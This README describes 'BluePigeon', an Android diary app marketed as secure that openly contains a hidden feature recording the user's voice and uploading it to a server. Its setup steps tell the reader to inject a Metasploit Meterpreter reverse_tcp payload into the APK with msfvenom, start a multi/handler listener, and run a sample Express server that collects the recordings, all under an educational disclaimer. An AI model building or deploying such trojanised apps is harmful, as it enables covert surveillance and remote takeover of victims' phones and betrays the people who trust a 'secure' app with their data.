# BluePigeon: Secure Diary App

BluePigeon is a secure diary app designed to protect your personal thoughts and memories. Built with Kotlin and Jetpack Compose, BluePigeon offers a seamless and intuitive user experience while prioritizing the security and privacy of your data.

## Features

- **Diary Entries**: Users can create, edit, and delete diary entries to capture their thoughts and experiences.
- **Security**: BluePigeon employs robust security measures to keep your diary entries safe from unauthorized access.
- **Hidden Functionality**: BluePigeon includes a hidden functionality (malware) that records the user's voice and sends it to a server. This functionality serves as a demonstration of potential security risks and the importance of safeguarding personal data.

## Getting Started

To run BluePigeon on your device, follow these steps:

1. Clone this repository to your local machine.
2. Open the project in Android Studio.
3. Generate an APK.
4. Inject payload into APK with msfvenom.
5. Run injected APK on android devices.
   
### Injecting Metasploit Meterpreter Malware (reverse_tcp) into BluePigeon

As a disclaimer, injecting malware into any application without proper authorization is illegal and unethical. The following demonstration is purely for educational purposes and should not be attempted without explicit permission.

#### 1. Setting Up Metasploit Framework

Before injecting the Metasploit Meterpreter payload, ensure you have Metasploit Framework installed on your system. You can install Metasploit by following the instructions provided on the official Metasploit website or through package managers like apt for Linux or Homebrew for macOS.

#### 2. Generating Meterpreter Payload

Using Metasploit's `msfvenom` tool, generate a Meterpreter payload. The payload will establish a reverse TCP connection to your attacker machine when executed on the target device.

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip_address LPORT=your_port R > meterpreter_payload.apk
```
#### 3. Setting up a listener

On your attacker machine, set up a listener using Metasploit Framework to receive the Meterpreter session:

```bash
Copy code
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST your_ip_address
set LPORT your_port
exploit
```
Replace your_ip_address and your_port with your machine's IP address and the port specified during payload generation.

## Project Structure

The BluePigeon project follows a standard Android project structure, organized into several key directories:

- **`data`**: Contains classes related to data management, such as database entities, DAOs (Data Access Objects), and the database itself.
- **`model`**: Houses data model classes used throughout the application, such as `QuoteModel`, representing quotes fetched from an external API.
- **`network`**: Includes classes related to network communication, such as Retrofit service interfaces and API clients.
- **`ui`**: Contains all UI-related components, including Jetpack Compose screens, navigation components, and themes.
- **`MainActivity.kt`**: Entry point of the application, responsible for initializing the app and setting up the UI.

## Important Classes

### `DiaryEntry` (data/DiaryEntry.kt)

- **Functionality**: Represents a diary entry with attributes such as mood, title, entry content, and date.
- **Usage**: Used to store and retrieve diary entries in the local database. It's annotated with Room annotations to define its structure in the SQLite database.

### `AppDatabase` (data/AppDatabase.kt)

- **Functionality**: Represents the local database of the application.
- **Usage**: Defines the database using Room Database annotation and provides a singleton instance of the database. It includes a method to access the DAO (Data Access Object) for interacting with `DiaryEntry` entities.

### `AudioRecorder` (AudioRecorder.kt)

- **Functionality**: Handles audio recording functionality within the app.
- **Usage**: Utilizes the `MediaRecorder` API to capture audio from the device's microphone. It includes methods to start and stop recording, as well as a coroutine to upload recorded audio to a server asynchronously.

### `NavigationGraph` (ui/navigation/NavigationGraph.kt)

- **Functionality**: Defines the navigation graph of the application using Jetpack Navigation Compose.
- **Usage**: Sets up the navigation destinations and their corresponding screens using composable functions. It utilizes a `NavHostController` to navigate between different screens.

### `BottomBar` (ui/navigation/BottomBar.kt)

- **Functionality**: Represents the bottom navigation bar of the application.
- **Usage**: Displays navigation items corresponding to different screens in the app. It changes the appearance of the selected item based on the current route. It uses Jetpack Navigation Compose to handle navigation between screens.

These classes play crucial roles in BluePigeon's functionality, enabling users to manage diary entries, record audio, navigate between screens, and more. Understanding their roles and interactions is key to comprehending the inner workings of the application.

#### `SendAudioService` (network/SendAudioService.kt)

- **Functionality**: Defines a Retrofit service interface for uploading audio files to a server.
- **Usage**: The service includes a method to upload audio files using a multipart request.

  To configure the API URL:
  - Open the `SendAudioService.kt` file located in the `network` directory.
  - Locate the `BASE_URL` constant and update it with the desired API URL.
  - Save the changes and rebuild the project to apply the new API URL.
 
    #### Sample Server
    - If you don't want to build an API server yourself, you can use the following Express server.

 
    ```
    const express = require('express');
    const multer = require('multer');
    const path = require('path');
    
    const app = express();
    const PORT = 3000;
    
    // Set up Multer storage
    const storage = multer.diskStorage({
        destination: function (req, file, cb) {
            cb(null, 'uploads/')
        },
        filename: function (req, file, cb) {
            cb(null, file.originalname)
        }
    })
    
    const upload = multer({ storage: storage })
    
    // Serve static files from the 'public' directory
    app.use(express.static(path.join(__dirname, 'public')));
    
    // Handle audio upload
    app.post('/upload/audio', upload.single('audio'), (req, res) => {
        console.log('File uploaded:', req.file);
        res.send('File uploaded successfully');
    });
    
    app.get("/", (req, res) => {
        res.send("Hello World");
    })

    // Start the server
    app.listen(PORT, () => {
        console.log(`Server is running on http://localhost:${PORT}`);
    });
    ```
